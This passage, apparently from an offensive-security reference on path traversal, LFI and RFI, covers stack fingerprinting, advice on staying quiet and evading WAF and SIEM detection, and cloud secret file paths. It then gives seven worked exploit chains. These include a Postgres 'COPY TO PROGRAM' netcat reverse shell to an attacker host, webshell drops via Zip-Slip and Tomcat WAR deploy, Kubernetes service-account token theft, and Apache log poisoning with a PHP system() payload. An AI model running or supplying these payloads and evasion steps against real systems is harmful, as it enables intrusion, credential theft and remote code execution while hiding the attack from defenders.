- **Stored URL columns** — a webhook URL that a downstream fetcher retrieves, combined with `file://` scheme → SSRF that reads local files.
- **Log tables** — an application log stored in DB with a `file_path` column that an admin viewer reads.

**Message-queue payloads:**

- **Job descriptors** — background job systems (Celery, Sidekiq, SQS, Kafka) carry job payloads with paths; a job that says "process file at X" reads X. If job payloads are attacker-influenced, traversal in the payload reads any file the worker can.
- **Result callbacks** — a job completion callback with an attacker-controlled result URL that a downstream processor fetches.

**Confirmation for non-URI contexts:**

- **Establish the source-to-sink dataflow** — the traversal payload has to reach a file operation. Grep for the source (`request.headers["X-Original-URL"]`, `body["template"]`, etc.) and follow every use of the extracted value.
- **The write endpoint may not be authenticated the same way as the read** — a header write via an authenticated endpoint may reach a public read endpoint that trusts the stored value.
- **Confirm via the same oracle patterns** — content-length divergence, canonical file bytes, error-shape delta — but the trigger is the header/field, not the URL.

**Common shapes to grep:**

- Python: `request.headers.get('X-Original-URL')`, `json.loads(body)['file']`, `session['template_path']`
- Node/Express: `req.headers['x-original-url']`, `req.body.file`, `req.cookies.template`
- Java: `request.getHeader("X-Original-URL")`, `request.getAttribute("template")`
- PHP: `$_SERVER['HTTP_X_ORIGINAL_URL']`, `$_COOKIE['template']`, `$_SESSION['file']`

Any of these reaching a `open`, `read`, `include`, `readFile`, `sendFile`, `File.new`, etc., without validation is the same class as a URL-based traversal — just harder to find because the source isn't the URL.

## Stack Fingerprinting from Traversal Behavior

The response shape to a probe often identifies the layer that produced it. Reading fingerprints from your own probe results lets you narrow the exploit path without side-channel scanning.

**Nginx signatures:**
- `400 Bad Request` on `%2e%2e/` — Nginx's own URI parser rejected. `400 Bad Request` HTML body typically has `<hr><center>nginx/<version></center>` — leaks Nginx version.
- `404 Not Found` with an HTML body identical to Nginx's default — Nginx served its own 404 (no backend involved). The traversal didn't reach the backend.
- `500 Internal Server Error` with an Nginx page — Nginx returned upstream error; the backend is present and errored.
- `502 Bad Gateway` — the backend upstream failed; traversal reached the backend and crashed it.

**Apache signatures:**
- `400` with `<address>Apache/<version></address>` — Apache's URL parser rejected.
- `Server: Apache/<version> (Ubuntu)` — a Server header revealing Apache and distribution.
- `404` with a mod_alias-style response — an AliasMatch config sent the request through Apache's own resolver.
- `403 Forbidden` with `.htaccess` blocking — usually a mod_authz_core or mod_authz_host block; probes revealing the blocking mechanism (`Forbidden` HTML body content) fingerprint the module.

**IIS signatures:**
- `HTTP Error 404.0 - Not Found` with the IIS style — IIS's own 404 (staticFile handler or default).
- `HTTP Error 500.19` — configuration error (web.config invalid); useful for confirmation but not exploitable per se.
- `HTTP Error 400.13 - Bad Request` — url too long; hits the URI-length gate.

**Tomcat / embedded servlet container signatures:**
- Stack traces containing `org.apache.catalina.` — Tomcat.
- `HTTP Status 404 – Not Found` with a Tomcat-shape HTML body — Tomcat's default error page.
- `HTTP Status 400 – Bad Request` on `%00`, `..;/`, or malformed characters — Tomcat's `RejectIllegalHeader` and related settings.
- `WARN [http-nio-8080-exec-N]` in error responses — Tomcat's connector-name naming convention.

**Node.js signatures:**
- Stack traces containing `at Object.<anonymous>` and `.js:` frames.
- `TypeError: Cannot read property ... of undefined` from Express — reveals Express.
- `PayloadTooLargeError` — Express body-parser catch.

**Python signatures:**
- Stack traces mentioning `File "/usr/lib/python...` or `File "/venv/..."` — reveals interpreter and virtual environment.
- `TemplateSyntaxError` (Jinja/Django), `WerkzeugException` — reveals framework.
- `MongoInvalidURIError` in a stack — MongoDB backend.

**PHP signatures:**
- `Warning: include(...): failed to open stream` — PHP `include` with `display_errors=On`; reveals the resolved include path.
- `Fatal error: require(): Failed opening required '...'` — same for `require`.
- The PHP error banner (`X-Powered-By: PHP/<version>` header) — reveals version.

**Java signatures:**
- Stack traces with `at java.base/...` or `at jakarta.servlet.` — Jakarta EE 9+; `javax.servlet.` — pre-9.
- `SEVERE:` log-level headers in error responses (Java Util Logging).
- `Whitelabel Error Page` — Spring Boot's default error page; reveals Spring Boot.

**Framework fingerprints in file paths that leak:**
- `/var/www/html/` — Debian/Ubuntu Apache.
- `/usr/local/apache2/` — RHEL Apache or compiled-from-source.
- `/var/lib/tomcat9/` — Debian Tomcat 9.
- `/opt/tomcat/` — manual Tomcat install.
- `C:\inetpub\wwwroot\` — IIS default.
- `C:\Program Files\Common Files\microsoft shared\web server extensions\` — SharePoint.
- `/usr/share/nginx/html/` — Nginx default.

**Assembled fingerprint from three probes:**
1. `GET /nonexistent-<rand>` — the 404 shape fingerprints the outermost error-serving layer.
2. `GET /?malformed=%00` — the response reveals the URL-parser layer that rejects `%00`.
3. `GET /?<param>=x'` (SQLi-shape) — the error shape reveals the language and framework.

Three requests, and the stack shape is usually known enough to pick the class-specific exploit path.

## Detection Discipline — Being Quiet

Traversal is a noisy class from a defender's perspective. Every `../` in a URL matches virtually every SIEM rule; every `/etc/passwd` request is logged; every `%2e%2e/` probe is flagged. When the scope requires stealth (a real red-team engagement, or research where the target is production-adjacent), a small number of high-value probes beats an enumeration sweep.

**Signals defenders see:**
- WAF logs with rule-name and rule-ID tags (Cloudflare `RULE_NAME`, AWS WAF `MetricName`, F5 ASM policy violation IDs).
- Reverse-proxy access logs with URI containing `..`, `%2e`, `%2f`.
- Application logs with framework-emitted "invalid path" or "not found" messages including the requested path.
- Filesystem-level auditd/EDR alerts on `openat(/etc/passwd)` or `openat(/etc/shadow)` from the app process — these are usually not traversal per se but any resulting read fires the alert.

**Practices that reduce signal:**
- **One canonical probe** — `/etc/hosts` is smaller than `/etc/passwd`, less alerted on, and confirms read primitive. Some SIEM rules key on `passwd`, not `hosts`.
- **Encoded probes only when needed** — an unencoded `../` matches more rules than an encoded `%2e%2e/` on modern WAFs. But the encoded form matches other rules; there is no universal quiet payload. Fingerprint the WAF first (§ WAF and CDN section) and pick the encoding that evades that specific WAF.
- **Time-space the probes** — burst probing (100 requests in 10 seconds against one endpoint) is anomalous; spread probes across the assessment window.
- **Chain to lower-noise reads** — once the class is confirmed, extract via a single carefully-chosen read (a config file with the DB creds) rather than an enumeration walk.
- **OAST callbacks are quieter than filesystem reads** for RFI confirmation — an OAST hit on your subdomain is unlikely to be flagged by a WAF; a `/etc/passwd` read is.

**Practices that guarantee detection:**
- Long enumeration walks against `/etc/`, `/proc/`, or `C:\Windows\`.
- Payloads containing `<script>` or `SELECT` alongside traversal — every WAF matches those.
- Repeated failed logins alongside traversal probes — combines two signal classes.
- Traversal in `User-Agent` header (some WAFs match this specifically).

## Cloud-Native Path Sinks

Cloud-native runtimes expose path sinks that differ structurally from single-host filesystem traversal — the "filesystem" is a virtualized mount, the "root" is the container's rootfs, and the sensitive files are the mount points of secrets and identity material.

**AWS Lambda:**
- Read-only rootfs — filesystem writes fail except in `/tmp` (512 MB scratch, wiped between invocations of cold-started sandboxes; may persist within a warm sandbox across invocations).
- `/var/task/` — the deployment package unpacked; source code and any bundled files. Traversal that reads `/var/task/index.py` reads the function source.
- `/opt/` — Lambda layers mounted; read across layers.
- `/proc/self/environ` — Lambda-injected environment variables including `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`, `AWS_LAMBDA_RUNTIME_API` (containers). The access-key/session-token trio grants IAM access under the Lambda execution role.
- `/var/runtime/`, `/var/lang/` — Lambda runtime and language binaries; usually not useful.

**AWS ECS / Fargate:**
- `169.254.170.2` — ECS credential provider (via `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` env var). Not a path read, but an HTTP fetch — the SSRF-adjacent side of container credentials. Route to `ssrf.md`.
- Bind-mounted volumes — read arbitrary content from the host per the mount configuration.

**Kubernetes (all runtimes):**
- `/var/run/secrets/kubernetes.io/serviceaccount/token` — the projected SA token (JWT).
- `/var/run/secrets/kubernetes.io/serviceaccount/ca.crt` — the API server CA cert.
- `/var/run/secrets/kubernetes.io/serviceaccount/namespace` — the namespace.
- Combined, these three form a `kubectl` client.
- `/proc/1/cgroup` — reveals the pod / container ID and Kubernetes-specific cgroup paths.
- `/etc/hostname` — often the pod name.
- Any secret-volume mount — the manifest's `volumeMounts` decide what's under `/etc/secrets/` or similar.

**GCP Cloud Run / GKE:**
- Metadata server at `169.254.169.254` — HTTP fetch, not a path read; SSRF class.
- `/var/run/secrets/tokens/gcp-ksa/token` — GKE Workload Identity token when configured.
- Read + the metadata `audience` parameter → OAuth token exchange.

**Azure Functions / App Service:**
- `/home/site/wwwroot/` — application code (equivalent of `/var/www/html`).
- `/etc/environment`, `/proc/self/environ` — injected app settings including connection strings.
- The IMDS endpoint `169.254.169.254/metadata/identity/oauth2/token?...` — Azure Managed Identity token.

**CI/CD workspace paths:**
- **GitHub Actions runners** — `$GITHUB_WORKSPACE` (typically `/home/runner/work/<repo>/<repo>`), `$GITHUB_TOKEN` in `/home/runner/work/_temp/_github_workflow/event.json` (event payload), and runner secrets often materialized as env vars in `/proc/self/environ`. A traversal on a build step that reads user-influenced paths reads pipeline secrets.
- **GitLab runner** — `/builds/<group>/<project>/` workspace; `.gitlab-ci.yml` variables in the environment.
- **Jenkins** — `$WORKSPACE`, `/var/lib/jenkins/secrets/master.key` (the master secret; decrypts stored credentials), `/var/lib/jenkins/users/*/config.xml` (user tokens).
- **CircleCI, TeamCity, Bitbucket Pipelines** — similar shapes.

**Container-image layers:**
- `/proc/self/mountinfo` — reveals every mount, including bind-mounts of host files into the container. A `/host` bind-mount is a common misconfiguration that gives full host filesystem access to any read primitive inside the container.
- Overlay filesystem layers — `/var/lib/docker/overlay2/<id>/...` on the host reveals per-image filesystem state; inside a container this is usually not reachable, but a container with `docker.sock` mounted has host-level Docker access.

**Cloud storage bindings that look like filesystems:**
- **s3fs, goofys, rclone-mount** — S3 buckets mounted as local filesystems; reads translate to S3 API calls. A traversal that reaches such a mount reads any file the mount's IAM identity can access, potentially across buckets.
- **Azure blob-fuse, GCS FUSE** — same shape for Azure and GCP.
- **NFS/SMB mounts** — traditional network mounts; the mount's credentials determine reach.

**Confirmation for cloud-native sinks:**
- Identify the runtime with a single read: `/proc/1/cgroup` (Docker / Kubernetes signature) → `/var/run/secrets/kubernetes.io/serviceaccount/*` (K8s specific) → the runtime-specific secret paths above.
- Read the identity material and validate externally (attempt an API call with the extracted token); the successful API call proves the token is live.

## Composite Chains — End-to-End Examples

The base names the chain shapes; here are worked examples at operational depth.

**Chain 1 — `LFI (PHP filter chain) → app source (base64) → hardcoded DB creds → SQLi → RCE (Postgres COPY TO PROGRAM):`**

1. Traversal confirmed on `?page=` parameter; `include($_GET['page'])` sink verified by the marker chain (echoes `MARKER_ZEN`).
2. Read `config.php` via base64 filter: `?page=php://filter/convert.base64-encode/resource=config.php`. Decode; find `$db_user = 'app'; $db_pass = 's3cr3t'; $db_host = 'db.internal';`.
3. From an SSRF or an in-cluster foothold, connect directly to `db.internal:5432` as `app:s3cr3t`. Confirm: `SELECT current_user, current_database()`.
4. If `app` has `pg_read_server_files` (superuser or explicit grant): `SELECT pg_read_server_files('/etc/passwd')` reads files as the DB process.
5. If `app` can `COPY ... TO PROGRAM`: `COPY (SELECT 1) TO PROGRAM 'nc attacker.tld 4444 -e /bin/sh'` — RCE as the DB process.
6. Report: initial traversal, read-of-config, credential extraction, DB access, and RCE as a chain — each hop routed (this file → `sql_injection.md` → RCE via `COPY TO PROGRAM`).

**Chain 2 — `Upload (any) → Zip-Slip → dropped webshell → RCE:`**

1. Identify an archive-import endpoint: an "import project" upload that unzips into a project-scoped directory.
2. Fingerprint the extraction — grep uploaded content for `../` handling; construct a probe ZIP with a marker entry (`../marker-<rand>.txt`) and observe whether the extraction produces the marker outside the project directory.
3. Confirm the class: a directory listing (or a downstream reader) revealed the marker file outside the intended directory.
4. Construct the exploit archive: entries include `../../public/shell.php` (a PHP webshell) alongside legitimate project files (to make the archive look benign).
5. Upload → extraction drops `shell.php` into the served webroot → `curl https://target/shell.php?c=id` → RCE.

**Chain 3 — `Reverse-proxy `/..;/` bypass → Tomcat Manager unauth reach → WAR deploy → RCE:`**

1. Recon: `Server: Apache` header, backend fingerprints as Tomcat via error page shape. `/manager/html` returns `403 Forbidden` at the proxy.
2. Probe: `GET /public/status` returns `200 OK` (proxy-allowed prefix). `GET /public/..;/manager/html` returns `401 Unauthorized` with Tomcat's basic-auth realm — the bypass reached the backend.
3. Enumerate: try default Tomcat manager credentials (`tomcat:tomcat`, `admin:admin`, `manager:manager`) or a credentials list. If found, proceed; else stop.
4. With manager credentials: `POST /public/..;/manager/text/deploy?path=/pwn` with a WAR file body containing a JSP webshell.
5. Access the deployed webshell via `/public/..;/pwn/shell.jsp?c=id` — RCE as the Tomcat user.
6. Report: proxy ACL bypass class, credential enumeration, WAR deploy, RCE.

**Chain 4 — `SSRF → PHP wrapper via SSRF-controlled URL → filesystem read on the internal service:`**

1. SSRF confirmed on `?url=` parameter of an internal proxy service; the service fetches the URL using a PHP HTTP client with `allow_url_fopen=On`.
2. Fingerprint: the SSRF service returns fetched content in the response body; the fetching library is PHP `file_get_contents` (confirmed by `X-Powered-By: PHP/8.4` in the fetching service's response headers).
3. `?url=php://filter/convert.base64-encode/resource=/etc/passwd` — the wrapper is executed by PHP's own URL handler; the base64-encoded `/etc/passwd` returns in the response body.
4. Decode and read the internal service's own configuration by iterating `resource=/var/www/html/config.php` — since the SSRF service IS a PHP app, it can read its own source via its own wrapper.
5. Chain: SSRF (route to `ssrf.md` for the outer surface) + PHP wrapper LFI (this file) → arbitrary internal file read at the SSRF service's identity.

**Chain 5 — `Second-order LFI via stored template name → SSTI → RCE:`**

1. An admin UI has a "custom report template" field storing a template name (e.g., `monthly-report.html.j2`).
2. Traversal probe: set the template name to `../../../../etc/passwd`. Admin save succeeds (no validation on write). On the next report generation, the template engine attempts to load the file — the response either shows `/etc/passwd` content (if the engine renders as text) or throws a template-parsing error naming the file (which itself is a leak).
3. Escalate to SSTI: write a Jinja2 template with SSTI payload to a location the app can reach:
   - Chain 5.a: separate write primitive (upload endpoint, or a `/tmp` write from another vuln) drops a malicious template.
   - Chain 5.b: log poisoning — write SSTI payload into a log file the reporter can read as a template.
4. Set template name to point at the poisoned file; report generation renders the SSTI payload; route to `ssti.md` for the SSTI-specific RCE class.

**Chain 6 — `Path traversal (config read) → cloud credentials → cloud-native lateral:`**

1. Traversal confirmed; read a canonical container-detection file: `?file=../../../../proc/1/cgroup`. Response contains `0::/kubepods.slice/kubepods-burstable-pod...` — the app runs inside Kubernetes.
2. Read the mounted service-account token: `?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/token`. The JWT lands in the response body.
3. Read the mounted CA cert and namespace: `?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/ca.crt` and `?file=../../../../var/run/secrets/kubernetes.io/serviceaccount/namespace`. The three artifacts together let a `kubectl` client (or a `curl` with `--cacert` + `-H "Authorization: Bearer <token>"`) query the Kubernetes API server.
4. From an attacker workstation with the token: `curl -k -H "Authorization: Bearer $TOKEN" https://<k8s-api>/api/v1/namespaces/<ns>/pods` — list pods in the namespace. If the SA has `list pods` permission, the response reveals the entire pod inventory.
5. Escalate per the SA's RBAC — `create pods`, `exec into pods`, `read secrets` — each unlocks a specific pivot. Read `.../secrets/` and iterate to find secrets granting further access (image-pull creds, database creds, cloud IAM tokens for the workload identity).
6. On AWS: `?file=../../../../var/run/secrets/eks.amazonaws.com/serviceaccount/token` reveals an EKS IRSA token; combined with `AWS_ROLE_ARN` and the STS AssumeRoleWithWebIdentity API, gives AWS IAM credentials. Route to `cloud/aws.md` for the AWS-side surface.
7. On GKE: `?file=../../../../var/run/secrets/tokens/gcp-ksa/token` reveals a GKE Workload Identity token; combined with GCP metadata `?audience=...`, exchanges for GCP OAuth credentials. Route to `cloud/gcp.md`.
8. Report the chain: base primitive (path traversal), container-runtime detection, service-account token disclosure, cloud-side credential materialization, downstream cloud-API access.

**Chain 7 — `Web LFI → apache access.log poisoning (long-tail) → RCE via subsequent include:`**

1. LFI confirmed on `?page=` parameter; include-shape sink. No `php://` scheme accepted (`allow_url_fopen=Off`).
2. Poison a log — cannot use `php://filter`, so use classic log poisoning. Send `curl -H 'User-Agent: <?php system($_GET["c"]);?>' https://target/`. The Apache access log records the User-Agent verbatim: `... "-" "<?php system($_GET[\"c\"]);?>"`.
3. Include the log: `?page=../../../../var/log/apache2/access.log&c=id`. The include reads the entire access log; PHP scans for `<?php` and executes it. Output includes the `id` command result.
4. Log size caveat: on busy servers, the access.log may be 100+ MB; the include may hit PHP memory limits or time-out. Try `error_log` (poison with a request that generates a warning, e.g., `?a[]=<?php system($_GET["c"]);?>`) — error.log is usually smaller.
5. Rotation risk: logrotate may compress the log during exploitation; include the rotated file (`access.log.1`, `access.log.1.gz` if PHP supports gzip). Note the `.gz` extension is opaque to PHP's include — PHP does not decompress on include; only if the log is not rotated does this work.

All chains illustrate the discipline: each hop is a granted capability, routed to the sibling skill that owns it — never a superlative claim about severity, only a reachability claim about capability.

## Summary

Advanced path-traversal / LFI / RFI depth is about the composition of layers — proxy vs backend, decode vs normalize, write vs read — and the specific bypass classes that live in each disagreement. Fingerprint the composition; confirm with a paired in-root control; scale to the class-specific exploit path. Measured behavior beats asserted behavior at every layer, and every architectural class persists across versions because it lives in the RFC-permitted divergence between components rather than in a single patched bug.
